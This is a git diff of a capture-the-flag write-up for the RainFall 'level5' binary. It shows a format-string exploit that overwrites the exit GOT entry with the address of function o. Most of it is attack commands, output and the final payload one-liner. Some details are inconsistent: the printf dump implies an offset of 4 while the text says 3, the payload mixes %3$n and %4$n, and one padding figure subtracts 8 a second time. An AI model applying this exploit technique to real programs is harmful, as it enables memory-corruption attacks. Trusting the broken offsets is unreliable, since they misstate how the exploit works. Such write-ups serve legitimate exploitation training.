@@ -1,5 +1,3 @@
-
-
 ```bash
 evel5@RainFall:~$ readelf -s level5 | grep o
 Symbol table '.dynsym' contains 10 entries:
@@ -15,16 +13,53 @@ Symbol table '.symtab' contains 73 entries:
 
 ```
 
-address of function o: 080484a4 -->  \xa4\x84\x04\x08
+```bash
+(gdb) x o
+0x80484a4 <o>:	0x83e58955
+```
+
+address of function o: `080484a4` == `\xa4\x84\x04\x08`
 
 ```bash
 level5@RainFall:~$ (python -c 'print ("AAAABBBB" + "%x " * 20)';cat) | ./level5
 AAAABBBB200 b7fd1ac0 b7ff37d0 41414141 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
 ```
 
-offset of buffer of printf is `3` 
+offset of buffer of printf is `3`
 
+---
 
 ```bash
-(python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
+level5@RainFall:~$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+```
+
+Address of exit is `08049838` == `\x38\x98\x04\x08`
+
+## Payload
+
+value to write = adress of o = `0x080484a4` = `134513828`
+
+Lets do 2 writes
+
+value 1: `0x 0000 84a4` = `33956`
+value 2: `0x 0001 0804` = `67588`
+
+cible 1 = `08049838` 				== `\x38\x98\x04\x08`
+
+cible 2 = cible1 + 2 ==  `804983A`	== `\x3a\x98\x04\x08`
+
+```python
+exploit = ""
+exploit += "\x38\x98\x04\x08"	//cible1
+exploit += "\x3a\x98\x04\x08"	//cible2
+exploit += "%3$33948x"			// padding to get to value 1 (33956 - 8 = 33948)
+exploit += "%3$n"				//write cible 1
+exploit += "%3$33624x"			//paddding to get to value 2 (67588 - 33956 - 8 = 33624)
+exploit += "%4$n"
+```
+
+```bash
+(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%3$33948x" + "%3$n" + "%3$33624x" + "%4$n")';cat) | ./level5
 ```
